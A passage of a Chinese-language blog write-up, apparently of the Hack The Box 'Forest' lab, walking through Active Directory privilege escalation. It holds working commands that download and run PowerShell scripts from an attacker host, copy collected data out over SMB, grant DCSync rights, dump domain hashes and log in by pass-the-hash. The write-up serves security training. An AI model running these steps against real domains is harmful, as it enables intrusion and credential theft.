+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Users\svc-alfresco\appdata\<span class="built_in">local</span>\temp</span><br><span class="line">iex(new-object net.webclient).downloadstring(<span class="string">&quot;http://10.10.14.26/SharpHound.ps1&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>使用获取到的凭证信息调用该脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8B%E5%8D%883.56.14.png" alt="截屏2022-03-14 下午3.56.14"><br>成功导出 zip 压缩格式的数据文件，在本地开启 smb 共享，需要使用身份认证否则会报错</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbserver.py mac -smb2support ~/hackthebox/Machines/Forest -username mac -password mac</span><br></pre></td></tr></table></figure>
+
+<p>在靶机中传输压缩文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.10.14.26\mac /u:mac mac</span><br><span class="line">copy 20220314010252_BloodHound.zip \\10.10.14.26\mac\</span><br><span class="line">net use /d \\10.10.14.26\mac //中断连接</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8B%E5%8D%884.05.53.png" alt="截屏2022-03-14 下午4.05.53"><br>在 BloodHound 中加载该压缩包，出现报错信息：无法解压 zip 数据文件<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8B%E5%8D%884.35.54.png" alt="截屏2022-03-14 下午4.35.54"></p>
+<p>原因是在使用 BloundHound 时的版本问题，需要切换至 foss_vnext 分支进行下载使用<br><strong>下载地址：<a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound/tree/foss_vnext/Collectors">https://github.com/BloodHoundAD/BloodHound/tree/foss_vnext/Collectors</a></strong><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%882.25.57.png" alt="截屏2022-03-15 下午2.25.57"><br>同时也需要重新下载版本为 4.0.3 的 BloodHound<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%882.37.47.png" alt="截屏2022-03-15 下午2.37.47"></p>
+<p>那么我们重复一遍之前的操作<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%882.30.20.png" alt="截屏2022-03-15 下午2.30.20"><br>将新下载的 4.0.3 版本的 BloodHound 移至本地，为 BloodHound 赋予执行权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x BloodHound</span><br><span class="line">./BloodHound --no-sandbox</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%882.49.45.png" alt="截屏2022-03-15 下午2.49.45"><br>点击“查找与管理员的最短路径”，从中可以发现<code>svc-alfresco</code>的访问权限至<code>Administrator</code>需要两次跳转<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%883.01.11.png" alt="截屏2022-03-15 下午3.01.11"></p>
+<h3 id="加入Exchange-Windows组"><a href="#加入Exchange-Windows组" class="headerlink" title="加入Exchange Windows组"></a>加入Exchange Windows组</h3><p>当前用户在 Service Account 中，后者则是 Privileged IT Account 组当中的成员，与此同时该组也是 Account Operators 组当中的成员，所以当前用户正处于 Account Operators 组当中。而 Account Operators 组对 Exchange Windows Permissions 组拥有 Generic All 权限。<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%883.51.50.png" alt="截屏2022-03-15 下午3.51.50"><br>因此我们可以滥用该权限将当前用户添加至 Exchange Windows Permissions 组当中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;Exchange Windows Permissions&quot;</span> svc-alfresco /add /domain</span><br><span class="line">net group <span class="string">&quot;Exchange Windows Permissions&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%883.57.20.png" alt="截屏2022-03-15 下午3.57.20"><br>成功添加至 Exchange Windows Permissions 组，但是靶机一直在清理 Exchange Windows Permissions 组当中的成员，为了确保当前账户的安全，我们可以新建一个账户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user mac mac@123 /add /domain</span><br></pre></td></tr></table></figure>
+<p>将其添加至 Exchange Windows Permissions 组当中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;Exchange Windows Permissions&quot;</span> mac /add /domain</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%884.28.04.png" alt="截屏2022-03-15 下午4.28.04"></p>
+<p>借助 PowerSploit 中的 powerview.ps1 来滥用<code>WriteDacl</code>权限 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iex(New-Object Net.webclient).downloadstring(<span class="string">&#x27;http://10.10.14.26/powerview.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>创建凭证对象并授予 DCSync 权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = convertto-securestring <span class="string">&#x27;mac@123&#x27;</span> -AsPlainText -Force</span><br><span class="line"><span class="variable">$cred</span> = New-Object System.Management.Automation.PSCredential (<span class="string">&#x27;HTB\mac&#x27;</span>, <span class="variable">$pass</span>)</span><br><span class="line">Add-DomainObjectAcl -Credential <span class="variable">$cred</span> -TargetIdentity <span class="string">&quot;DC=htb,DC=local&quot;</span> -PrincipalIdentity mac -Rights DCSync</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%884.27.54.png" alt="截屏2022-03-15 下午4.27.54"></p>
+<h3 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h3><blockquote>
+<p>DCSync可从利用DRS(Directory Replication Service)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据</p>
+</blockquote>
+<p><strong>DCSync参考文章：<a target="_blank" rel="noopener" href="https://yojimbosecurity.ninja/dcsync/">https://yojimbosecurity.ninja/dcsync/</a></strong><br>使用 secretsdump.py 获取哈希值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py mac:mac@123@10.10.10.161</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%884.29.22.png" alt="截屏2022-03-15 下午4.29.22"></p>
+<h3 id="管理员登陆"><a href="#管理员登陆" class="headerlink" title="管理员登陆"></a>管理员登陆</h3><p>使用 wmiexec.py 通过哈希传递连接管理员</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%884.33.29.png" alt="截屏2022-03-15 下午4.33.29"><br>在管理员桌面上寻找 flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir C:\Users\administrator\Desktop</span><br><span class="line"><span class="built_in">type</span> C:\Users\administrator\Desktop\root.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%884.37.23.png" alt="截屏2022-03-15 下午4.37.23"></p>
+<p>成功拿到第二个flag</p>
+<p>除了以上方法，使用 WinRM 也可以成功登陆</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.161 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%884.39.34.png" alt="截屏2022-03-15 下午4.39.34"></p>
+<p><strong>总结：通过RPC远程过程调用发现靶机所处环境为域环境，同时拿到枚举的用户列表。使用AS-REP Roasting技术可破解用户账户拿到明文密码，GetNPUsers帮助我们拿到了svc-alfresco用户哈希，hashcat则成功破解密码，通过WinRM成功登陆用户。在靶机上可使用SharpHound来收集域内信息，通过BloodHound分析收集到的域内信息。其中出现一个小插曲：kali中默认安装的BloodHound版本存在问题，无法解析SharpHound收集到的数据信息，将其版本切换至4.0.3即可。经过分析后发现当前用户所处组对Exchange Windows Permissions组拥有Generic All权限，新建用户mac并将其添加至该用户组，使用DCSync从域控制器复制用户凭据，具体可使用secretsdump获取管理员凭据，最终通过wmiexec或WinRM哈希传递可获取管理员权限。</strong></p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/8461de82/">HTB: Sniper<span class="note">Older</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
